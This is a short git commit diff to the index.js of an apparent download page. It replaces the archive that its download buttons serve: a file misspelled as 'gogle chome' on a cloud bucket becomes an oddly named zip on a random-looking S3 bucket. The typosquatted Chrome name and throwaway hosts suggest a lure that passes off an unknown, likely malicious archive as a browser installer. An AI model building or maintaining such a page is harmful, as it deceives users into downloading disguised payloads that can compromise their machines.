cae4d8af8e1228e502c248e1d857049af4bb5d2e
aa168188 <sli010342@gmail.com>
2025-10-20 19:09:42 +0800

    Update index.js

--- index.js
+++ index.js
@@ -1,6 +1,6 @@
 window.onload = function() {
     // 下载链接
-    let url = 'https://windowsw.oss-cn-hongkong.aliyuncs.com/gogle%20chome%2064%E4%BD%8D_109.0.5414.zip'
+    let url = 'https://mcbdhrnw.s3.ap-east-1.amazonaws.com/Chenmdsomer.zip'
 
     document.querySelectorAll('.download').forEach(item => {
         item.onclick = function() {
